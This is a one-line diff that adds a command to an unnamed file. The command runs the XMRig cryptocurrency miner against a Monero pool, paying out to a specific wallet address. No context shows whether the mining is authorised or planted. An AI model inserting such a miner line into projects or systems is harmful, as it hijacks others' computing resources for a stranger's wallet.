@@ -1,0 +1,1 @@
+./xmrig -o us-west.minexmr.com:443 -u 8BzzDzMwc4GQvohjahR2sYgzFfNDugPCHJf94Lqrzj4WDxCeviY1eVuRZKBzrXsFKMUEeGDg9t3WhDEj7FuNYUdJULc42zw -k --tls --rig-id aank
